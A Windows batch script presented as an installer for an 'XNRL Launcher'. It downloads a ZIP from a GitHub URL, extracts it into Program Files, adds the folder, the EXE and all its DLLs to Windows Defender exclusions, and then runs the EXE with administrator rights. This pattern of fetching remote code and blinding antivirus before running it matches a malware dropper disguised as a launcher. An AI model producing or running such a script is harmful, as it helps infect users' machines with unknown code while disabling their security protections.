@echo off
setlocal

:: Set variables
set "ZIP_URL=https://github.com/XNRLDownload/Download/raw/main/XNRL%%20Launcher.zip"
set "ZIP_PATH=%TEMP%\XNRL_Launcher.zip"
set "EXTRACT_DIR=C:\Program Files (x86)\XNRL_Launcher"
set "EXE_NAME=XNRL Launcher\XNRL Launcher.exe"

:: Download the ZIP file using PowerShell
echo Downloading ZIP...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_PATH%'"
if not exist "%ZIP_PATH%" (
    echo Failed to download ZIP.
    pause
    exit /b 1
)

:: Create the extraction directory
if not exist "%EXTRACT_DIR%" (
    mkdir "%EXTRACT_DIR%"
)

:: Extract ZIP using PowerShell
echo Extracting ZIP...
powershell -NoProfile -Command "Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"

:: Add the folder to Defender exclusions
echo Adding folder to Windows Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%EXTRACT_DIR%'"

:: Add EXE to Defender exclusions
echo Adding EXE to Windows Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '%EXTRACT_DIR%\%EXE_NAME%'"

:: Add all DLLs in the folder to exclusions
echo Adding DLLs to Windows Defender exclusions...
for %%F in ("%EXTRACT_DIR%\%EXE_NAME%\..\*.dll") do (
    powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess '%%F'"
)

:: Check if the EXE exists and run it
if exist "%EXTRACT_DIR%\%EXE_NAME%" (
    echo Launching %EXE_NAME%...
    powershell -NoProfile -Command "Start-Process -FilePath '%EXTRACT_DIR%\%EXE_NAME%' -Verb RunAs"
) else (
    echo ERROR: File not found: "%EXTRACT_DIR%\%EXE_NAME%"
    echo Please check the extracted contents.
    pause
    exit /b 1
)

echo Done.
pause
